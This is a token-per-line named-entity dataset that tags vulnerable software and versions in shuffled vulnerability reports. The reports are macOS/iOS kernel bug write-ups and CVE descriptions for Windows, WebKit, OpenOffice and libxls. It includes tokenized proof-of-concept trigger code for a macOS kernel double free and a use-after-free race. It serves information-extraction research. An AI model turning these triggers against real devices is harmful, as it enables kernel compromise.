error O O
= O O
soopt_getm O O
( O O
sopt O O
, O O
& O O
token O O
) O O
; O O
if O O
( O O
error O O
) O O
{ O O
goto O O
done O O
; O O
} O O
error O O
= O O
soopt_mcopyin O O
( O O
sopt O O
, O O
token O O
) O O
; O O
if O O
( O O
error O O
) O O
{ O O
goto O O
done O O
done O O
: O O
if O O
( O O
token O O
! O O
= O O
NULL O O
) O O
{ O O
mbuf_freem O O
( O O
token O O
) O O
; O O
} O O
soopt_getm O O
allocates O O
an O O
mbuf O O
. O O

mbufs O O
are O O
aggressivly O O
cached O O
but O O
with O O
sufficiently O O
full O O
caches O O
m_freem O O
will O O
eventually O O
fall O O
through O O
to O O
freeing O O
back O O
to O O
a O O
zalloc O O
zone O O
, O O
and O O
that O O
zone O O
could O O
potentially O O
be O O
garbage O O
collected O O
leading O O
to O O
the O O
ability O O
to O O
actually O O
exploit O O
such O O
an O O
issue O O
. O O

Tested O O
on O O
MacOS S-vulnerable_software pair_0
10.13 S-vulnerable_version pair_0
( O O
17A365 S-vulnerable_version pair_0
) O O
on O O
MacBook S-vulnerable_software pair_1
Air5,2 S-vulnerable_version pair_1
ianbeer O O
if O O
0 O O
MacOS/iOS O O
kernel O O
double O O
free O O
due O O
to O O
incorrect O O
API O O
usage O O
in O O
flow O O
divert O O
socket O O
option O O
handling O O
SO_FLOW_DIVERT_TOKEN O O
is O O
a O O
socket O O
option O O
on O O
the O O
SOL_SOCKET O O
layer O O
. O O

Tested O O
on O O
MacOS S-vulnerable_software pair_0
10.13 S-vulnerable_version pair_0
( O O
17A365 S-vulnerable_version pair_0
) O O
on O O
MacBookAir5,2 O O
endif O O
include O O
< O O
stdlib.h O O
include O O
< O O
stdio.h O O
include O O
< O O
sys/socket.h O O
int O O
main O O
( O O
) O O
{ O O
int O O
sock O O
= O O
socket O O
( O O
PF_INET O O
, O O
SOCK_DGRAM O O
, O O
0 O O
) O O
; O O
if O O
( O O
socket O O
< O O
0 O O
) O O
{ O O
printf O O
( O O
failed O O
to O O
create O O
socket O O
) O O
; O O
return O O
0 O O
; O O
} O O
printf O O
( O O
socket O O
: O O
% O O
d O O
, O O
sock O O
) O O
; O O
setsockopt O O
( O O
sock O O
, O O
SOL_SOCKET O O
, O O
0x1106 O O
, O O
( O O
void O O
) O O
424242424242 O O
, O O
100 O O
) O O
; O O
return O O
0 O O
; O O
} O O

Apple O O
macOS/iOS O O
- O O
Kernel O O
Double O O
Free O O
due O O
to O O
Incorrect O O
API O O
Usage O O
in O O
Flow O O
Divert O O
Socket O O
Option O O
Handling O O

The O O
issue O O
involves O O
the O O
IOSurface O O
component O O
. O O

If O O
a O O
MIG O O
method O O
returns O O
an O O
error O O
code O O
, O O
then O O
it O O
took O O
ownership O O
of O O
none O O
of O O
the O O
arguments O O
passed O O
to O O
it O O
. O O

Proof O O
of O O
Concept O O
: O O

IOSurfaceRootUserClient O O
external O O
method O O
17 O O
( O O
s_set_surface_notify O O
) O O
will O O
drop O O
a O O
reference O O
on O O
the O O
wake_port O O
( O O
via O O
IOUserClient O O
: O O
:releaseAsyncReference64 O O
) O O
then O O
return O O
an O O
error O O
code O O
if O O
the O O
client O O
has O O
previously O O
registered O O
a O O
port O O
with O O
the O O
same O O
callback O O
function O O
. O O

Tested O O
on O O
MacOS S-vulnerable_software pair_0
10.13 S-vulnerable_version pair_0
( O O
17A365 S-vulnerable_version pair_0
) O O
on O O
MacBookAir5,2 O O
async_wake O O
exploit O O
attached O O
. O O

If O O
the O O
external O O
method O O
returns O O
an O O
error O O
then O O
MIG O O
will O O
assume O O
that O O
the O O
reference O O
was O O
not O O
consumed O O
by O O
the O O
external O O
method O O
and O O
as O O
such O O
the O O
MIG O O
generated O O
coode O O
will O O
drop O O
a O O
reference O O
on O O
the O O
port O O
. O O

If O O
an O O
IOKit O O
userclient O O
external O O
method O O
takes O O
an O O
async O O
wake O O
mach O O
port O O
argument O O
then O O
the O O
lifetime O O
of O O
the O O
reference O O
on O O
that O O
mach O O
port O O
passed O O
to O O
the O O
external O O
method O O
will O O
be O O
managed O O
by O O
MIG O O
semantics O O
. O O

Gets O O
tfp0 O O
on O O
all O O
64-bit O O
devices O O
plus O O
an O O
initial O O
PoC O O
local O O
kernel O O
debugger O O
. O O

Tested O O
on O O
iOS S-vulnerable_software pair_0
11.0.3 S-vulnerable_version pair_0
( O O
11A432 S-vulnerable_version pair_0
) O O
on O O
iPhone S-vulnerable_software pair_1
6s S-vulnerable_version pair_1
( O O
MKQL2CN/A O O
) O O

This O O
bug O O
is O O
reachable O O
from O O
the O O
iOS O O
app O O
sandbox O O
as O O
demonstrated O O
by O O
this O O
PoC O O
. O O

See O O
the O O
README O O
and O O
kdbg.c O O
for O O
details O O
. O O

Apple O O
macOS/iOS O O
- O O
Kernel O O
Double O O
Free O O
due O O
to O O
IOSurfaceRootUserClient O O
not O O
Respecting O O
MIG O O
Ownership O O
Rules O O

The O O
issue O O
involves O O
the O O
IOKit O O
component O O
. O O

IOUserClient O O
: O O
:clientClose O O
is O O
not O O
a O O
destructor O O
and O O
plays O O
no O O
role O O
in O O
the O O
lifetime O O
management O O
of O O
an O O
IOKit O O
object O O
. O O

Source O O
: O O
provides O O
the O O
userspace O O
interface O O
for O O
the O O
IOTimeSyncClockManager O O
IOService O O
. O O

Tested O O
on O O
MacOS S-vulnerable_software pair_0
10.13 S-vulnerable_version pair_0
( O O
17A365 S-vulnerable_version pair_0
) O O
on O O
MacBookAir5,2 O O
ianbeer O O
build O O
: O O
clang O O
-o O O
timesync_uaf O O
timesync_uaf.c O O
-framework O O
IOKit O O
-lpthread O O
repro O O
: O O
while O O
true O O
; O O
do O O
./timesync_uaf O O
; O O
done O O
if O O
0 O O
MacOS O O
multiple O O
kernel O O
UAFs O O
due O O
to O O
incorrect O O
IOKit O O
object O O
lifetime O O
management O O
in O O
IOTimeSyncClockManagerUserClient O O
IOTimeSyncClockManagerUserClient O O
provides O O
the O O
userspace O O
interface O O
for O O
the O O
IOTimeSyncClockManager O O
IOService O O
. O O

For O O
an O O
exploit O O
some O O
care O O
would O O
be O O
required O O
to O O
ensure O O
correct O O
interleaving O O
such O O
that O O
the O O
OSArray O O
was O O
destroyed O O
and O O
then O O
used O O
before O O
the O O
lock O O
which O O
is O O
supposed O O
to O O
be O O
protecting O O
the O O
array O O
is O O
also O O
destroyed O O
, O O
but O O
it O O
would O O
be O O
quite O O
possible O O
. O O

IOTimeSyncClockManagerUserClient O O
: O O
:clientClose O O
drops O O
references O O
on O O
a O O
bunch O O
of O O
OSArrays O O
causing O O
them O O
to O O
be O O
free O O
d O O
, O O
it O O
also O O
destroys O O
the O O
locks O O
which O O
are O O
supposed O O
to O O
protect O O
access O O
to O O
those O O
arrays O O
. O O

This O O
leads O O
directly O O
to O O
multiple O O
UaFs O O
if O O
you O O
also O O
call O O
external O O
methods O O
which O O
manipulate O O
those O O
arrays O O
in O O
other O O
threads O O
. O O

Tested O O
on O O
MacOS S-vulnerable_software pair_0
10.13 S-vulnerable_version pair_0
( O O
17A365 S-vulnerable_version pair_0
) O O
on O O
MacBookAir5,2 O O
endif O O
include O O
< O O
stdio.h O O
include O O
< O O
stdlib.h O O
include O O
< O O
string.h O O
include O O
< O O
pthread.h O O
include O O
< O O
mach/mach.h O O
include O O
< O O
IOKit/IOKitLib.h O O
int O O
go O O
= O O
0 O O
; O O
void O O
thread_func O O
( O O
void O O
arg O O
) O O
{ O O
io_object_t O O
conn O O
= O O
( O O
io_object_t O O
) O O
arg O O
; O O
go O O
= O O
1 O O
; O O
IOServiceClose O O
( O O
conn O O
) O O
; O O
return O O
0 O O
; O O
} O O
int O O
main O O
( O O
int O O
argc O O
, O O
char O O
argv O O
) O O
{ O O
kern_return_t O O
err O O
; O O
io_service_t O O
service O O
= O O
IOServiceGetMatchingService O O
( O O
kIOMasterPortDefault O O
, O O
IOServiceMatching O O
( O O
IOTimeSyncClockManager O O
) O O
) O O
; O O
if O O
( O O
service O O
IO_OBJECT_NULL O O
) O O
{ O O
printf O O
( O O
unable O O
to O O
find O O
service O O
) O O
; O O
return O O
0 O O
; O O
} O O
io_connect_t O O
conn O O
= O O
MACH_PORT_NULL O O
; O O
err O O
= O O
IOServiceOpen O O
( O O
service O O
, O O
mach_task_self O O
( O O
) O O
, O O
0 O O
, O O
& O O
conn O O
) O O
; O O
if O O
( O O
err O O
! O O
= O O
KERN_SUCCESS O O
) O O
{ O O
printf O O
( O O
unable O O
to O O
get O O
user O O
client O O
connection O O
) O O
; O O
return O O
0 O O
; O O
} O O
pthread_t O O
thread O O
; O O
pthread_create O O
( O O
& O O
thread O O
, O O
NULL O O
, O O
thread_func O O
, O O
( O O
void O O
) O O
conn O O
) O O
; O O
while O O
( O O
! O O
go O O
) O O
{ O O
; O O
} O O
uint64_t O O
inputScalar O O
[ O O
16 O O
] O O
; O O
uint64_t O O
inputScalarCnt O O
= O O
0 O O
; O O
char O O
inputStruct O O
[ O O
4096 O O
] O O
; O O
size_t O O
inputStructCnt O O
= O O
0 O O
; O O
uint64_t O O
outputScalar O O

It O O
is O O
perfectly O O
possible O O
to O O
call O O
: O O
:clientClose O O
( O O
via O O
io_service_close O O
) O O
in O O
one O O
thread O O
and O O
call O O
an O O
external O O
method O O
in O O
another O O
thread O O
at O O
the O O
same O O
time O O
. O O

IOTimeSyncClockManagerUserClient O O
overrides O O
the O O
IOUserClient O O
: O O
:clientClose O O
method O O
but O O
it O O
treats O O
it O O
like O O
a O O
destructor O O
. O O

Apple O O
macOS/iOS O O
- O O
Multiple O O
Kernel O O
Use-After-Frees O O
due O O
to O O
Incorrect O O
IOKit O O
Object O O
Lifetime O O
Management O O
in O O
IOTimeSyncClockManagerUserClient O O

macOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
10.13.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
issue O O
involves O O
the O O
Sandbox O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
via O O
a O O
crafted O O
mach O O
binary O O
. O O

The O O
issue O O
involves O O
the O O
CFNetwork O O
component O O
. O O

The O O
issue O O
involves O O
the O O
HFS O O
component O O
. O O

The O O
issue O O
involves O O
the O O
Open O O
Scripting O O
Architecture O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
AppleScript O O
file O O
that O O
is O O
mishandled O O
by O O
osadecompile O O
. O O

The O O
issue O O
involves O O
the O O
ATS O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
obtain O O
sensitive O O
information O O
from O O
process O O
memory O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
) O O
via O O
a O O
crafted O O
font O O
. O O

The O O
issue O O
involves O O
the O O
ImageIO O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
image O O
file O O
. O O

The O O
issue O O
involves O O
the O O
libarchive O O
component O O
. O O

It O O
allows O O
remote O O
attackers O O
to O O
execute O O
arbitrary O O
code O O
or O O
cause O O
a O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
via O O
a O O
crafted O O
archive O O
file O O
. O O

The O O
issue O O
involves O O
the O O
fsck_msdos O O
component O O
. O O

The O O
issue O O
involves O O
the O O
Remote O O
Management O O
component O O
. O O

iTunes S-vulnerable_software pair_0
before S-vulnerable_version pair_0
12.7.1 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

Safari S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.0.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

iCloud S-vulnerable_software pair_0
before S-vulnerable_version pair_0
7.1 S-vulnerable_version pair_0
on O O
Windows O O
is O O
affected O O
. O O

tvOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

iOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
11.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

The O O
vulnerability O O
was O O
confirmed O O
on O O
ASan O O
build O O
of O O
WebKit O O
nightly O O
. O O

Source O O
: O O
is O O
a O O
use-after-free O O
security O O
vulnerability O O
in O O
WebKit O O
. O O

The O O
issue O O
involves O O
the O O
APFS O O
component O O
. O O

watchOS S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.1 S-vulnerable_version pair_0
is O O
affected O O
. O O

On O O
Safari O O
on O O
Mac O O
this O O
can O O
be O O
accomplished O O
by O O
opening O O
the O O
inspector O O
( O O
simply O O
opening O O
the O O
inspector O O
enables O O
accessibility O O
features O O
) O O
. O O

On O O
WebKitGTK+ O O
( O O
and O O
possibly O O
other O O
WebKit O O
releases O O
) O O
accessibility O O
features O O
are O O
enabled O O
by O O
default O O
. O O

Note O O
that O O
accessibility O O
features O O
need O O
to O O
be O O
enabled O O
in O O
order O O
to O O
trigger O O
this O O
bug O O
. O O

The O O
apetag.c O O
file O O
in O O
MP3Gain S-vulnerable_software pair_0
1.5.2.r2 S-vulnerable_version pair_0
has O O
a O O
vulnerability O O
which O O
results O O
in O O
a O O
stack O O
memory O O
corruption O O
when O O
opening O O
a O O
crafted O O
MP3 O O
file O O
. O O

Kernel O O
pool O O
memory O O
corruption O O
in O O
one O O
of O O
drivers O O
in O O
Kaspersky S-vulnerable_software pair_0
Embedded S-vulnerable_software pair_0
Systems S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
version O O
1.2.0.300 S-vulnerable_version pair_0
leads O O
to O O
local O O
privilege O O
escalation O O
. O O

Memory O O
corruption O O
in O O
Gemalto S-vulnerable_software pair_0
HASP S-vulnerable_software pair_0
SRM S-vulnerable_software pair_0
, O O
Sentinel S-vulnerable_software pair_0
HASP S-vulnerable_software pair_0
and S-vulnerable_software pair_0
Sentinel S-vulnerable_software pair_0
LDK S-vulnerable_software pair_0
products O O
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
Sentinel O O
LDK O O
RTE O O
version O O
7.55 S-vulnerable_version O
might O O
cause O O
remote O O
code O O
execution O O
. O O

A O O
vulnerability O O
in O O
Apache S-vulnerable_software pair_0
OpenOffice S-vulnerable_software pair_0
Writer S-vulnerable_software pair_0
DOC S-vulnerable_software pair_0
file S-vulnerable_software pair_0
parser S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.1.4 S-vulnerable_version pair_0
, O O
and O O
specifically O O
in O O
ImportOldFormatStyles O O
, O O
allows O O
attackers O O
to O O
craft O O
malicious O O
documents O O
that O O
cause O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
potentially O O
resulting O O
in O O
arbitrary O O
code O O
execution O O
. O O

A O O
vulnerability O O
in O O
OpenOffice S-vulnerable_software pair_0
PPT S-vulnerable_software pair_0
file S-vulnerable_software pair_0
parser S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.1.4 S-vulnerable_version pair_0
, O O
and O O
specifically O O
in O O
PPTStyleSheet O O
, O O
allows O O
attackers O O
to O O
craft O O
malicious O O
documents O O
that O O
cause O O
denial O O
of O O
service O O
( O O
memory O O
corruption O O
and O O
application O O
crash O O
) O O
potentially O O
resulting O O
in O O
arbitrary O O
code O O
execution O O
. O O

Malformed O O
input O O
may O O
lead O O
to O O
crashes O O
( O O
with O O
a O O
buffer O O
overflow O O
or O O
other O O
memory O O
corruption O O
) O O
or O O
other O O
unspecified O O
behaviors O O
. O O

This O O
crosses O O
a O O
privilege O O
boundary O O
in O O
, O O
for O O
example O O
, O O
certain O O
web-hosting O O
environments O O
in O O
which O O
a O O
Control O O
Panel O O
allows O O
an O O
unprivileged O O
user O O
account O O
to O O
create O O
subaccounts O O
. O O

In O O
shadow S-vulnerable_software pair_0
before S-vulnerable_version pair_0
4.5 S-vulnerable_version pair_0
, O O
the O O
newusers O O
tool O O
could O O
be O O
made O O
to O O
manipulate O O
internal O O
data O O
structures O O
in O O
ways O O
unintended O O
by O O
the O O
authors O O
. O O

An O O
attacker O O
can O O
send O O
a O O
malicious O O
XLS O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

A O O
specially O O
crafted O O
XLS O O
file O O
with O O
a O O
formula O O
record O O
can O O
cause O O
memory O O
corruption O O
resulting O O
in O O
remote O O
code O O
execution O O
. O O

An O O
exploitable O O
out-of-bounds O O
vulnerability O O
exists O O
in O O
the O O
xls_addCell O O
function O O
of O O
libxls S-vulnerable_software pair_0
1.4 S-vulnerable_version pair_0
. O O

An O O
exploitable O O
integer O O
overflow O O
vulnerability O O
exists O O
in O O
xls_appendSST O O
function O O
of O O
libxls S-vulnerable_software pair_0
1.4 S-vulnerable_version pair_0
. O O
A O O
specially O O
crafted O O
XLS O O
file O O
can O O
cause O O
memory O O
corruption O O
resulting O O
in O O
remote O O
code O O
execution O O
. O O

A O O
specially O O
crafted O O
.TGA O O
file O O
can O O
cause O O
an O O
out O O
of O O
bounds O O
write O O
resulting O O
in O O
potential O O
code O O
execution O O
. O O

An O O
attacker O O
can O O
send O O
a O O
specific O O
.TGA O O
file O O
to O O
trigger O O
this O O
vulnerability O O
. O O

A O O
memory O O
corruption O O
vulnerability O O
exists O O
in O O
the O O
.TGA O O
parsing O O
functionality O O
of O O
Computerinsel S-vulnerable_software pair_0
Photoline S-vulnerable_software pair_0
20.02 S-vulnerable_version pair_0
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
and O O
CVE-2017-11916 O O
. O O

ChakraCore O O
, O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
Escape O O
Analysis O O
Bug O O

ChakraCore O O
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
ChakraCore O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11911 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
, O O
and O O
Internet O O
Explorer O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Internet O O
Explorer O O
and O O
Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11886 O O
, O O
CVE-2017-11889 O O
, O O
CVE-2017-11890 O O
, O O
CVE-2017-11893 O O
, O O
CVE-2017-11894 O O
, O O
CVE-2017-11895 O O
, O O
CVE-2017-11901 O O
, O O
CVE-2017-11903 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11905 O O
, O O
CVE-2017-11907 O O
, O O
CVE-2017-11908 O O
, O O
CVE-2017-11909 O O
, O O
CVE-2017-11910 O O
, O O
CVE-2017-11912 O O
, O O
CVE-2017-11913 O O
, O O
CVE-2017-11914 O O
, O O
CVE-2017-11916 O O
, O O
CVE-2017-11918 O O
, O O
and O O
CVE-2017-11930 O O
. O O

ChakraCore O O
and O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
